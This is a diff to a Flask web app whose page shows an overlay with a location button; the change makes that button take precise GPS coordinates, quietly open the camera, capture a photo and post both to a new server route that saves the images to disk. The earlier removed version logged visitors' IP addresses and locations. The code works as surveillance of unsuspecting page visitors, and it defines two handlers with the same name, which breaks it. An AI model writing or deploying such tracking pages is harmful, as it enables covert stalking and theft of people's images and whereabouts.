@@ -120,59 +120,59 @@ HTML_TEMPLATE = """
     </div>
 
     <script>
-        document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
-            try {{
-                // Log the permission request
-                await fetch('/log', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        type: 'permission_request',
-                        ip: await fetch('/getip').then(r => r.text()),
-                        timestamp: new Date().toISOString()
-                    }})
-                }});
-                
-                // Request actual location
-                const position = await new Promise((resolve, reject) => {{
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {{
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }});
-                }});
-                
-                // Log successful location
-                await fetch('/log', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        type: 'location_data',
-                        ip: await fetch('/getip').then(r => r.text()),
-                        lat: position.coords.latitude,
-                        lng: position.coords.longitude,
-                        accuracy: position.coords.accuracy,
-                        timestamp: new Date().toISOString()
-                    }})
-                }});
-                
-                // Remove overlay
-                document.querySelector('.gps-overlay').remove();
-            }} catch (error) {{
-                console.error('Location error:', error);
-                await fetch('/log', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{
-                        type: 'error',
-                        error: error.message,
-                        ip: await fetch('/getip').then(r => r.text()),
-                        timestamp: new Date().toISOString()
-                    }})
-                }});
-                alert('Location access is required to continue.');
-            }}
-        }});
+ document.getElementById('gps-allow-btn').addEventListener('click', async function() {
+  try {
+    // 1. Get GPS first (your existing code)
+    const position = await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
+    });
+
+    // 2. Request camera permission
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: true,
+      audio: false 
+    });
+    
+    // 3. Capture photo
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    
+    const photoData = canvas.toDataURL('image/jpeg', 0.8); // 80% quality
+    
+    // 4. Stop camera
+    stream.getTracks().forEach(track => track.stop());
+    
+    // 5. Send data to server (including photo)
+    await fetch('/log_data', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        gps: {
+          lat: position.coords.latitude,
+          lng: position.coords.longitude
+        },
+        photo: photoData, // Base64 encoded image
+        timestamp: new Date().toISOString()
+      })
+    });
+    
+    // 6. Hide overlay
+    document.getElementById('gps-overlay').remove();
+    
+  } catch (error) {
+    console.error('Error:', error);
+    alert(`Error: ${error.message}`);
+  }
+});
     </script>
 </body>
 </html>
@@ -194,6 +194,23 @@ def serve_page():
 def get_ip():
     """Endpoint to get client IP"""
     return request.headers.get('X-Forwarded-For', request.remote_addr)
+
+@app.route('/log_data', methods=['POST'])
+def log_data():
+    try:
+        data = request.json
+        # Save photo (example saves as file)
+        if data.get('photo'):
+            photo_data = data['photo'].split(',')[1]  # Remove data:image/jpeg;base64,
+            with open(f"photos/{datetime.now().isoformat()}.jpg", "wb") as f:
+                f.write(base64.b64decode(photo_data))
+        
+        logger.info(f"Data received: {data}")
+        return jsonify({'status': 'success'})
+    except Exception as e:
+        logger.error(f"Error: {str(e)}")
+        return jsonify({'status': 'error'}), 500
+
 
 @app.route('/log', methods=['POST'])
 def log_data():
